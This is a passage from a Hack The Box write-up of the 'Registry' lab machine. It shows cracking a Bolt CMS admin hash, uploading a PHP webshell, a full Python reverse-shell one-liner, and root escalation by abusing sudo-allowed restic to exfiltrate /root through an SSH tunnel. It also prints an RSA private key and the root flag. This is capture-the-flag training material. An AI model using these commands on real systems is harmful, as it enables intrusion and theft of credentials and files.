
<p>There is another interesting file inside the database: <code class="language-plaintext highlighter-rouge">bolt.db</code>. So, we can download it in local and try to fetch some things from it_</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/var/www/html/bolt/app/database$ which python
/usr/bin/python
bolt@bolt:/var/www/html/bolt/app/database$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; wget registry.htb:8000/bolt.db
--2020-05-01 08:16:14--  http://registry.htb:8000/bolt.db
Risoluzione di registry.htb (registry.htb)... 10.10.10.159
Connessione a registry.htb (registry.htb)|10.10.10.159|:8000... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 294912 (288K) [application/octet-stream]
Salvataggio in: "bolt.db"

bolt.db                              100%[======================================================================&gt;] 288,00K  1,58MB/s    in 0,2s    

2020-05-01 08:16:14 (1,58 MB/s) - "bolt.db" salvato [294912/294912]
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; sqlite3 bolt.db
SQLite version 3.30.1 2019-10-10 20:19:45
Enter ".help" for usage hints.
sqlite&gt; .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite&gt; select * FROM bolt_users
   ...&gt; ;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
</code></pre></div></div>

<p>Sincerily: When i found some passwords inside the databases i get excited more than a fuck. Well, letâ€™s crack it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 4096/10037 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=6 -D KERN_TYPE=3200 -D _unroll'                         
* Device #1: Kernel m03200-pure.3089d00d.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P...cpY7PK
Time.Started.....: Fri May  1 08:35:43 2020 (11 secs)
Time.Estimated...: Fri May  1 08:35:54 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       34 H/s (7.12ms) @ Accel:8 Loops:2 Thr:8 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 384/14344385 (0.00%)
Rejected.........: 0/384 (0.00%)
Restore.Point....: 256/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
Candidates.#1....: angelo -&gt; michael1

Started: Fri May  1 08:35:32 2020
Stopped: Fri May  1 08:35:55 2020
</code></pre></div></div>

<p>Password: <code class="language-plaintext highlighter-rouge">strawberry</code> Now we can use this password through the Bolt CMS previously found:</p>

<p><img src="/assets/images/htb-writeup-registry/registry9.jpg" alt="" /></p>

<p><img src="/assets/images/htb-writeup-registry/registry10.jpg" alt="" /></p>

<p><img src="/assets/images/htb-writeup-registry/registry11.jpg" alt="" /></p>

<p>Taking a look on <code class="language-plaintext highlighter-rouge">File Management</code> itâ€™s seems that we can upload files. But <code class="language-plaintext highlighter-rouge">php</code> extension is forbidden. Fortunately we are logged in as admin and we can fix that thing adding php files to the accepted file types:</p>

<p><img src="/assets/images/htb-writeup-registry/registry12.jpg" alt="" /></p>

<p><img src="/assets/images/htb-writeup-registry/registry13.jpg" alt="" /></p>

<p>The webshell would stop working pretty quickly and the file would disappear. Why? Remember that interesting â€˜sync.shâ€™ file we found earlier from the archivies?</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo html -&gt; cat sync.sh
#!/bin/bash
rsync -azP registry:/var/www/html/bolt .
</code></pre></div></div>

<p>Thatâ€™s probably running as a cron job very regularly and overwriting everything in /var/www/html/bolt and its subdirectories. So i decided to obtain the reverse connection as www-data with a python reverse shell on the bolt ssh session:</p>

<p><code class="language-plaintext highlighter-rouge">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/var/www/html$ nc -lvnp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 127.0.0.1 43310 received!
/bin/sh: 0: can't access tty; job control turned off
$ 
</code></pre></div></div>

<p>Finally!</p>

<h2 id="privesc-to-root">PrivEsc to Root</h2>

<p>www-data is allowed to run restic as root:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
</code></pre></div></div>

<p>A quick google search lead me to Restic docs <code class="language-plaintext highlighter-rouge">https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html</code> specifically the section on REST server. This is the steps I followed:</p>

<p>Install restic and create a repository (with passwd asdasd)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; apt-get install restic
root@lorenzooo registry -&gt; restic init --repo rest1
enter password for new repository: 
enter password again: 
created restic repository de68ef2b8d at rest1

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
</code></pre></div></div>

<p>Set up a ssh tunnel for port 8000 on my machine to port 8000 on Registry:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo .ssh -&gt; ssh bolt@registry.htb -i id_rsa -R 8000:127.0.0.1:8000
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri May  1 06:11:05 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 29%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    171
Last login: Fri May  1 04:10:14 2020 from 10.10.14.45
</code></pre></div></div>

<p>Install rest-server from this repository <code class="language-plaintext highlighter-rouge">https://github.com/restic/rest-server</code> to our local machine and set up the server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo rest-server -&gt; make
go: downloading github.com/spf13/cobra v0.0.1
go: downloading github.com/prometheus/client_golang v0.8.0
go: downloading goji.io v2.0.2+incompatible
go: downloading golang.org/x/crypto v0.0.0-20180214000028-650f4a345ab4
go: downloading github.com/miolini/datacounter v0.0.0-20171104152933-fd4e42a1d5e0
go: downloading github.com/gorilla/handlers v1.3.0
go: downloading github.com/prometheus/common v0.0.0-20180110214958-89604d197083
go: downloading github.com/prometheus/procfs v0.0.0-20180212145926-282c8707aa21
go: downloading github.com/golang/protobuf v1.0.0
go: downloading github.com/prometheus/client_model v0.0.0-20171117100541-99fa1f4be8e5
go: downloading github.com/beorn7/perks v0.0.0-20160804104726-4c0e84591b9a
go: downloading github.com/spf13/pflag v1.0.0
go: downloading github.com/matttproud/golang_protobuf_extensions v1.0.0
root@lorenzooo rest-server -&gt; make install
/usr/bin/install -m 755 rest-server /usr/local/bin/rest-server
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo rest-server -&gt; rest-server --path rest1 --no-auth
Data directory: rest1
Authentication disabled
Private repositories disabled
Starting server on :8000
</code></pre></div></div>

<p>Run the Restic backup as root, telling it to backup Registryâ€™s /root folder to the REST server at http://127.0.0.1:8000 (which is tunneled to my machine):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root
enter password for repository: 
password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 368e55c4 saved
</code></pre></div></div>

<p>And restored the snapshot by</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; restic -r rest1 restore latest --target restore/
enter password for repository: 
repository de68ef2b opened successfully, password is correct
created new cache in /root/.cache/restic
restoring &lt;Snapshot 368e55c4 of [/root] at 2020-05-01 06:50:28.258536034 +0000 UTC by root@bolt&gt; to restore/
</code></pre></div></div>

<p>Now we can connect through ssh and cat the root.txt</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm
cJB/3psQocosq+GMh9Y/uRPUgMcDnrTaNYOdkPS+QLd8vcFKSwSewH1w4/AYLuci
4k71qYsJlkcS2Pb0PqEcpodmXf4OBdTCiCCnjgGhOcvPpKMSCb1vy2Yo+A+eHzKp
1S48LgJRLKU1sGe0KE4MC8g7qpF7NSKOCW69z5KaoopQA3jPxnW17WE9PdGZQvqX
4/Mf9DGdeUrejRlX0BI2EGiZhPKwwKxqIHLRpw4pR4+OjR1sOkAA7UWtMYn/3cs+
IS3L75/i5Qsr0cMCtZ/hQAKtjpPoCCe1qHp7CQIDAQABAoIBAFlvYtQaoLGKK2NG
sJgOGDicV8o37bvtLCvVBzJ+Ck0rgnGw4/s1Hb2BpOj8c2dY/T5k55zxEMGYuVUC
BAxBTtCp8yuCTPOekQluqN9w6myZCK9Ol0NSJeI3N1zn6NvUkG0293T55EBuBp0D
k82BhTg1YeQzi00xAmp8bb5MjUFCiCbSFH1MMpY/9itg1b3mqx7UlyDldMM9UdKH
HS9aZmAzY5/U6wEtJi4mx3QIoVahytMgcxd7qoicCYyVm73HFQsZ58L+5QflygH4
dpbptPOnNmLUkWFXcK3bmlmrEyuafS6z68oDFeAZz8Dg2D2qXWfhdlN4GVstlxSI
skH5sAECgYEAySOp7KOZJVpstF8zjn+/OZowEF4iSHnaGAX64B6GgWwXQURn3wVq
tlqDO5m5vIexe2tyFDSVe5otWtzQvbPNkjpD7/kglGTbT9PCU/Dgb5pTmOxBPi9a
1W8+q7lwiXLIRb4NB+BqDz0yI924BnZt9rukzm9650Rrbala0HZxhIECgYEAxCux
RQUzgSx7YdzThvB8sAzQJj2gNAbwEA9Y56I0pQLvTNoGQY8V8IYBrlvW935kLfcf
xz8j5VNt1BizDQjG8j5FfVcU6VE98/OMgn4XKd6nl9sOoQBXzssjUF+3AIhn5DsK
Q/IymTZEmhfGAt9k6dE4WH8qffea/E7qJY+pkokCgYAdatLiYjb2yJfXdYkD0Vk1
YoCfFDVtZizokI9VkgFYEmgASrHqY09tJiXFZMFOeoYRp/BCVkJ6ll0Fyf/Zjt+F
AHKJOWVzbqDItw7X2gXpLKgHWJ5eKuzdBG0lDnUQFTKHSLl9Kmw4mFmp9zZ/83g3
us/qxVEzW8Vef4Nhs8D8gQKBgDtsMMqDhNKAMu+2AK1Dc8GwX+z1he28nEOBIqEn
1WKWvP4+nN6HBVJShXfXggp+UsJJtWqZiboRx5cT1EkCe6Etk8cf9cmnPmkDQXDV
2RZpx8KMLKZAgFi31/6kv759k1rjN3zVhNY8RhOXV/fOy7a4FaVY//ogYuZC0VKH
bgphAoGBAKGyJQe/b6rUkpzvIBxbGt9Hw1kpLr07VCdPQb1MCdCU4l+mlDD5NBN3
mzygp6MTi+TvN3PhxlfAmUPbz0qw+3aX95pt2cQ492wLOe+RsVsKtvDTgH/2+DUe
2qnb+Jd6ERs3jmBeuuavC2O5ajhyLt1xL3uF5UVpoenCYlYuOvL4
-----END RSA PRIVATE KEY-----
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; cd restore
root@lorenzooo restore -&gt; ls
root
root@lorenzooo restore -&gt; cd root
root@lorenzooo root -&gt; ls
config.yml  cron.sh  root.txt
root@lorenzooo root -&gt; cd .ssh
root@lorenzooo .ssh -&gt; ls
authorized_keys  id_rsa  id_rsa.pub
root@lorenzooo .ssh -&gt; ssh -i id_rsa root@10.10.10.159
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri May  1 06:53:53 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 31%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    176
Last login: Mon Oct 21 09:53:48 2019
root@bolt:~# cat /root/root.txt
ntrkzgnkotaxyju0ntrinda4yzbkztgw
</code></pre></div></div>

<h2 id="hack-only-for-fun-and-learning-not-for-profit">Hack only for fun and learning. Not for profit</h2>

<p><img src="/assets/images/htb-writeup-registry/registry14.jpg" alt="" /></p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#docker-registry-vulnerable" class="page__taxonomy-item" rel="tag">Docker Registry Vulnerable</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#fetch-sqlite3-db" class="page__taxonomy-item" rel="tag">Fetch Sqlite3 DB</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#registry" class="page__taxonomy-item" rel="tag">Registry</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#shell-upload" class="page__taxonomy-item" rel="tag">Shell Upload</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sudo-l" class="page__taxonomy-item" rel="tag">Sudo -l</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-05-01T00:00:00+02:00">May 01, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-kotarak/" class="pagination--pager" title="Kotarak - Hack The Box
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2020 Ezplosiite</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
